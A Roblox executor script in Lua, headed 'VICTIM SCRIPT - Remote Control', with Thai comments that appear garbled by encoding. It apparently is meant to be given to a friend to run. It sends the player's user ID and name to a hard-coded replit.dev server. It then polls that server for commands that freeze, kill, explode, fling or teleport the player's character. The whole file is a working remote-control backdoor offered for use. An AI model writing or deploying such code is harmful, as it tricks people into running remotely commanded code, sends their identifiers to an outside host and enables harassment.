-- ===========================================
-- VICTIM SCRIPT - Remote Control
-- ‡πÉ‡∏´‡πâ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ô‡∏£‡∏±‡∏ô‡πÉ‡∏ô Roblox Executor
-- ===========================================

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

print("üåê REMOTE CONTROL VICTIM SCRIPT")
print("üë§ Player:", LocalPlayer.Name)
print("üÜî User ID:", LocalPlayer.UserId)

-- ‚ö†Ô∏è ‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô URL ‡∏ô‡∏µ‡πâ‡πÄ‡∏õ‡πá‡∏ô‡∏Ç‡∏≠‡∏á‡∏Ñ‡∏∏‡∏ì!
local SERVER_URL = "https://414aac7e-b745-411d-9730-ded3092e5d80-00-2pab606sq7y1h.pike.replit.dev/api"
local VICTIM_ID = tostring(LocalPlayer.UserId)
local VICTIM_NAME = LocalPlayer.Name

-- ‡∏ï‡∏±‡∏ß‡πÅ‡∏õ‡∏£‡πÄ‡∏Å‡πá‡∏ö‡∏™‡∏ñ‡∏≤‡∏ô‡∏∞
local IsFrozen = false
local OriginalWalkSpeed = 16
local OriginalJumpPower = 50

-- Function ‡∏£‡∏≤‡∏¢‡∏á‡∏≤‡∏ô‡∏ï‡∏±‡∏ß‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡πÄ‡∏ã‡∏¥‡∏£‡πå‡∏ü‡πÄ‡∏ß‡∏≠‡∏£‡πå
local function reportToServer()
    local success = pcall(function()
        HttpService:PostAsync(
            SERVER_URL .. "/report",
            HttpService:JSONEncode({
                victim_id = VICTIM_ID,
                victim_name = VICTIM_NAME
            }),
            Enum.HttpContentType.ApplicationJson
        )
    end)
    return success
end

-- Function ‡∏Ç‡∏≠‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏à‡∏≤‡∏Å‡πÄ‡∏ã‡∏¥‡∏£‡πå‡∏ü‡πÄ‡∏ß‡∏≠‡∏£‡πå
local function fetchCommands()
    local success, response = pcall(function()
        return HttpService:GetAsync(
            SERVER_URL .. "/commands?victim_id=" .. VICTIM_ID,
            true
        )
    end)
    
    if success and response then
        local data = HttpService:JSONDecode(response)
        return data.commands or {}
    end
    return {}
end

-- Function ‡∏õ‡∏£‡∏∞‡∏°‡∏ß‡∏•‡∏ú‡∏•‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á
local function executeCommand(cmdData)
    local command = cmdData.command
    local args = cmdData.args or {}
    
    if command == "freeze" then
        if IsFrozen then return end
        IsFrozen = true
        
        local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
        if humanoid then
            OriginalWalkSpeed = humanoid.WalkSpeed
            OriginalJumpPower = humanoid.JumpPower
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
            
            for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.Anchored = true
                end
            end
        end
        
    elseif command == "unfreeze" then
        if not IsFrozen then return end
        IsFrozen = false
        
        local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = OriginalWalkSpeed
            humanoid.JumpPower = OriginalJumpPower
            
            for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.Anchored = false
                end
            end
        end
        
    elseif command == "kill" then
        local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.Health = 0
        end
        
    elseif command == "explode" then
        if LocalPlayer.Character then
            local explosion = Instance.new("Explosion")
            explosion.Position = LocalPlayer.Character.HumanoidRootPart.Position
            explosion.BlastRadius = 12
            explosion.Parent = workspace
        end
        
    elseif command == "slap" then
        if LocalPlayer.Character then
            local force = Instance.new("BodyVelocity")
            force.Velocity = Vector3.new(0, 100, 0)
            force.MaxForce = Vector3.new(0, 100000, 0)
            force.Parent = LocalPlayer.Character.HumanoidRootPart
            task.wait(0.5)
            force:Destroy()
        end
        
    elseif command == "bring" then
        if args[1] and LocalPlayer.Character then
            LocalPlayer.Character:MoveTo(args[1])
        end
        
    elseif command == "speed" then
        local speed = args[1] or 16
        local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = speed
        end
        
    elseif command == "jump" then
        local jump = args[1] or 50
        local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.JumpPower = jump
        end
    end
end

-- ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏ï‡∏±‡∏ß‡∏•‡∏∞‡∏Ñ‡∏£‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô
LocalPlayer.CharacterAdded:Connect(function()
    if IsFrozen then
        task.wait(1)
        local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
        end
    end
end)

-- Main loop
spawn(function()
    print("üì° Connecting to server...")
    
    if reportToServer() then
        print("‚úÖ Connected to server!")
        print("üîó Server URL:", SERVER_URL)
    else
        print("‚ùå Failed to connect")
        return
    end
    
    while true do
        pcall(function()
            -- ‡∏£‡∏≤‡∏¢‡∏á‡∏≤‡∏ô‡∏ï‡∏±‡∏ß‡∏ó‡∏∏‡∏Å 30 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ
            if os.time() % 30 == 0 then
                reportToServer()
            end
            
            -- ‡∏î‡∏∂‡∏á‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á
            local commands = fetchCommands()
            for _, cmd in ipairs(commands) do
                executeCommand(cmd)
            end
        end)
        task.wait(2)
    end
end)

print("üéÆ Ready! Waiting for commands...")
